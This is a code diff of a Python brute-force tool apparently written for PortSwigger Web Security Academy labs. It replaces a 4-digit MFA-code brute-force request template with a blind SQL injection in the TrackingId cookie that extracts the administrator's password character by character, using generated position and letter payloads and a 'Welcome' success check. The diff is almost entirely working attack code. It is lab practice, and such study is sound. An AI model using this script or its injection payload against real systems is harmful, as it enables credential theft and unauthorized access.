@@ -18,33 +18,34 @@
 import asyncio
 import itertools
 import re
+import subprocess
 import httpx
+import tempfile
 
-CONCURRENCY_LIMIT = 20
+CONCURRENCY_LIMIT = 1
+PRINT_OUTPUT_PREVIEW = False
+SAVE_OUTPUT_TO_FILE = False
 
 # RAW request (from Burp Intruder) with placeholders like §1§, §2§... or §CODE§, §USER§
 RAW_REQUEST = """
-POST /login2 HTTP/2
-Host: 0af1007904fe18d780313a98005c00a1.web-security-academy.net
-Cookie: verify=carlos; session=pXCNlviwuhdDHlQfoLEVgQ76rB0SVXAC
-Cache-Control: max-age=0
-Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: "Linux"
+GET /filter?category=Pets HTTP/2
+Host: 0a1c00cc034bb5dd809d67ee006400fe.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br, zstd
+Connection: keep-alive
+Referer: https://0a1c00cc034bb5dd809d67ee006400fe.web-security-academy.net/
+Cookie: session=BlbXyDIAePEoXIqm1KbNNAx52HSo5rpk; TrackingId=IQ629qN4TF6IQ2Gn'+AND+(SELECT+SUBSTRING(password,§POS§,1)+FROM+users+WHERE+username='administrator')='§LETTER§
 Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
-Origin: https://0af1007904fe18d780313a98005c00a1.web-security-academy.net
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
 Sec-Fetch-Dest: document
-Referer: https://0af1007904fe18d780313a98005c00a1.web-security-academy.net/login2
-Accept-Encoding: gzip, deflate, br
-
-mfa-code=§CODE§
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Pragma: no-cache
+Cache-Control: no-cache
+TE: trailers
 """.strip()
 
 # --- PAYLOAD GENERATORS ---
@@ -60,15 +61,31 @@ def generate_wordlist(file_path):
         for line in f:
             yield line.strip()
 
+import string
 def generate_payloads():
     """
     Change this function depending on your needs.
     Returns something like this: {"§PLACEHOLDER§": "VALUE"}
     """
+
+    # One-shot payload (no placeholders)
+    # return [{}]
+
+    for pos in range(1, 21):
+
+        for l in string.ascii_lowercase:
+            yield {"§LETTER§": l, "§POS§": pos}
+        for l in string.ascii_uppercase:
+            yield {"§LETTER§": l, "§POS§": pos}
+        for n in range(10):
+            yield {"§LETTER§": str(n), "§POS§": pos}
+
+    # for n in range(2,30):
+    #    yield {"§len§": n}
     
     # EXAMPLE 1: Single payload (4-digits OTP)
-    for otp in generate_otps(length=4):
-        yield {"§CODE§": otp}
+    #for otp in generate_otps(length=4):
+    #    yield {"§CODE§": otp}
 
     # EXAMPLE 2: Multi-payload / Cluster Bomb (Username + Password)
     # usernames = ["admin", "carlos", "wiener"]
@@ -80,6 +97,11 @@ def generate_payloads():
     # for user, pwd in zip(users_list, pass_list):
     #     yield {"§USER§": user, "§PASS§": pwd}
 
+def check_victory (response):
+    """Check if the response is a victory condition."""
+    # return True
+    return response.status_code == 200 and ("Welcome" in response.text)
+    # return response.status_code == 302 # and "Location" in response.headers
 
 # --- PARSER & ENGINE ---
 
@@ -116,6 +138,23 @@ def inject_payloads(raw_template: str, payload_dict: dict) -> str:
         result = result.replace(placeholder, str(value))
     return result
 
+def open_in_editor_or_browser(content: str, open_file: bool = False):
+    """Salva il contenuto in /tmp e lo apre con il gestore di sistema (xdg-open)."""
+    # ext = ".html" if is_html else ".txt"
+    # with tempfile.NamedTemporaryFile("w", delete=False, suffix=ext, prefix="repeater_res_") as f:
+    with open('/tmp/brute.html', 'w') as f:
+        f.write(content)
+        temp_path = f.name
+
+    print(f"\n[+] Saved response in: {temp_path}")
+
+    if open_file:
+        # xdg-open for default app
+        try:
+            subprocess.Popen(["xdg-open", temp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception as e:
+            print(f"[-] Impossibile aprire xdg-open: {e}")
+
 async def test_code(client, semaphore, method, url, headers, body_template, payload_dict, stop_event):
     if stop_event.is_set():
         return
@@ -139,14 +178,34 @@ async def test_code(client, semaphore, method, url, headers, body_template, payl
             )
 
             # Victory condition
-            if response.status_code == 302:
+            if check_victory(response):
                 stop_event.set()
                 print(f"\n[+] Valid response (HTTP {response.status_code})!")
                 print(f"[+] Valid payload: {payload_dict}")
                 print(f"[+] Header Location: {response.headers.get('Location')}")
                 print(f"[+] Set-Cookie: {response.headers.get('Set-Cookie')}")
+
+                print(f"\n{"="*20} RESPONSE {"="*20}")
+                print(f"HTTP/{response.http_version} {response.status_code} {response.reason_phrase}")
+                for k, v in response.headers.items():
+                    print(f"{k}: {v}")
                 
-        except Exception:
+
+                if PRINT_OUTPUT_PREVIEW:
+                    print("\n" + response.text[:100]) # Anteprima terminale (primi 1000 char)
+                    if len(response.text) > 100:
+                        print("\n[... Output troncato a terminale ...]")
+                    print("="*59)
+
+                if SAVE_OUTPUT_TO_FILE:
+                    # Save and open the full response in a temporary file
+                    full_output = f"HTTP/{response.http_version} {response.status_code} {response.reason_phrase}\n"
+                    full_output += "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
+                    full_output += "\n\n" + response.text
+                    open_in_editor_or_browser(full_output)
+                
+        except Exception as ex:
+            print(ex)
             pass
 
 async def main():
